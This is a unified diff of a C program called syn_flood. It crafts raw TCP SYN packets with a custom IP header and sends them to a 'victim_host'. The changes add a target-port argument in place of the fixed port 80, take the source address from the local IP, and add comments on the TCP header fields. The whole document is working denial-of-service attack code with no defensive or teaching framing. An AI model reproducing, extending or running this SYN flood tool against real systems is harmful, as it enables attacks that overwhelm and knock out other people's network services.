@@ -98,17 +98,20 @@ csum(unsigned short *ptr,int nbytes)
 int
 main(int argc, char *argv[])
 {
+    int                  port;
     struct iphdr	     *iph;
     struct tcphdr	     *tcph;
     struct in_addr       srcd_ip, dest_ip;
     struct sockaddr_in   dest;
     struct pseudo_header psh;
-    char   datagram[BUFFER_SIZE], des_ip[128] = {'\0'}, src_ip[128] = {'\0'};
+    char   *victim_host,datagram[BUFFER_SIZE], des_ip[128] = {'\0'}, src_ip[128] = {'\0'};
 
-    if(argc < 2) {
-        printf("./syn_flood host\n");
+    if(argc < 3) {
+        printf("./syn_flood host port\n");
         exit(-1);
     }
+    port = atoi(argv[2]);
+    victim_host = argv[1];
 
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (s < 0) {
@@ -118,14 +121,15 @@ main(int argc, char *argv[])
     iph = (struct iphdr *) datagram;
     tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
 
-    get_ip_from_host(des_ip, argv[1], sizeof(des_ip));
+    get_ip_from_host(des_ip, victim_host, sizeof(des_ip));
     if (inet_pton (AF_INET, des_ip, &dest_ip.s_addr) <= 0)
     {
         perror("inet_pton");
         exit(-1);
     }
 
-    get_ip_from_host(src_ip, "localhost", sizeof(src_ip));
+    //get_ip_from_host(src_ip, "10.168.22.12", sizeof(src_ip));
+    get_local_ip(src_ip);
     if (inet_pton (AF_INET, src_ip, &srcd_ip.s_addr ) <= 0)
     {
         perror("inet_pton");
@@ -160,10 +164,13 @@ main(int argc, char *argv[])
     //chekc sum 
     iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);
 
-    //TCP Header
+    // source port
     tcph->source = htons(43591);
-    tcph->dest = htons(80);
+    //destination port
+    tcph->dest = htons(port);
+    //tcp sequence number
     tcph->seq = htonl(110502497);
+    //tcp acknowledge number
     tcph->ack_seq = 0;
     tcph->doff = sizeof(struct tcphdr) / 4;
     tcph->fin = 0;
@@ -172,8 +179,11 @@ main(int argc, char *argv[])
     tcph->psh = 0;
     tcph->ack = 0;
     tcph->urg = 0;
+    //window size
     tcph->window = htons(43690);
     tcph->urg_ptr = 0;
+    //before check, fill with zero
+    tcph->check = 0;
 
     int one = 1;
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
@@ -184,9 +194,8 @@ main(int argc, char *argv[])
     bzero(&dest, sizeof(dest));
     dest.sin_family = AF_INET;
     dest.sin_addr.s_addr = dest_ip.s_addr;
-    dest.sin_port = htons(80);
+    dest.sin_port = htons(port);
 
-    tcph->check = 0;
 
     //get_ip_from_host(src_ip, "localhost", sizeof(src_ip));
     //if (inet_pton (AF_INET, src_ip, &psh.src_addr) <= 0){
